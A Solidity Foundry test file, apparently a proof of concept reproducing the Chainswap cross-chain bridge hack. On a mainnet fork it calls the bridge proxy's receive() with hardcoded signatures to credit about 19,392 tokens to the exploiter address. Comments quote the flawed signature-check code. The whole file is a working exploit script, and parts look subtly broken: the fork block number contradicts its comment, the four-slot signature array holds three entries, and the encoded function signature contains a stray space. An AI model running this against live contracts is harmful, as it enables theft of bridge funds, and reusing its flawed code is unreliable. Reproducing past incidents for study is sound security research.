// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.6.0 <0.9.0;

import "forge-std/Test.sol";
import "./interface.sol";

struct Signature {
    address signatory;
    uint8   v;
    bytes32 r;
    bytes32 s;
}

interface IChainswap {
  function receive(uint256 fromChainId, address to, uint256 nonce, uint256 volume, Signature[] memory signatures) virtual external payable;
}

contract ContractTest is DSTest {
  address exploiter = 0x941a9E3B91E1cc015702B897C512D265fAE88A9c;
  address proxy = 0x7fe68FC06e1A870DcbeE0acAe8720396DC12FC86;
  address impl = 0x373CE6Da1AEB73A9bcA412F2D3b7eD07Af3AD490;

  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

  function setUp() public {
    cheats.createSelectFork(eth, 12751487); // fork mainnet at block 13125070
    // https://etherscan.io/tx/0x5c5688a9f981a07ed509481352f12f22a4bd7cea46a932c6d6bbe67cca3c54be
  }

  function testExploit() public {
    Signature[] memory sigs = new Signature[](4);
    sigs[0] = Signature({signatory: 0x8C46b006D1c01739E8f71119AdB8c6084F739359, v: 27, r: 0x7b9ce0f78253f7dcf8bf6a2d7a4c38a151eba15eefe6b355a67a373653192765, s: 0x0a4b99389149cc4f7f6051299145c113f5aa50dccf19f748516c4c977f475d6c});
    sigs[1] = Signature({signatory: 0x4F559d3c39C3F3d408aFBFB27C44B94badA8dEd5, v: 27, r: 0x692e284a3efd148d6dd23b44055740fac7154a482fbeff7f2cc4acf4002fa62d, s: 0x1134236483ad360a775e6c22100f83ba5091115323417205cfbd4ae898cd0bc2});
    sigs[2] = Signature({signatory: 0x6EA6D36d73cF8ccD629Fbc5704eE356144A89A06, v: 28, r: 0x9ca27b8ec05746c43cd67e0099015ea9b88bdf34e8acfd6ace9dd63b8a320433, s: 0x1d4aaa253afc6c5d5f893d4a572de830538aeef3b65cb6ff3bb6fec738a899d0});
    
    proxy.call(abi.encodeWithSignature("receive(uint256,address,uint256,uint256, Signature[])", 1, exploiter, 1, 19392277118050930170440,  sigs));
    // function receive(uint256 fromChainId, address to, uint256 nonce, uint256 volume, Signature[] memory signatures) virtual external payable {
    // _chargeFee();
    // require(received[fromChainId][to][nonce] == 0, 'withdrawn already');
    // uint N = signatures.length;
    // require(N >= Factory(factory).getConfig(_minSignatures_), 'too few signatures');
    // for(uint i=0; i<N; i++) {
    //     for(uint j=0; j<i; j++)
    //         require(signatures[i].signatory != signatures[j].signatory, 'repetitive signatory');
    //     bytes32 structHash = keccak256(abi.encode(RECEIVE_TYPEHASH, fromChainId, to, nonce, volume, signatures[i].signatory));
    //     bytes32 digest = keccak256(abi.encodePacked("\x19\x01", _DOMAIN_SEPARATOR, structHash));
    //     address signatory = ecrecover(digest, signatures[i].v, signatures[i].r, signatures[i].s);
    //     require(signatory != address(0), "invalid signature");
    //     **require(signatory == signatures[i].signatory, "unauthorized");**
    //     _decreaseAuthQuota(signatures[i].signatory, volume);
  }

  receive() external payable {}
}
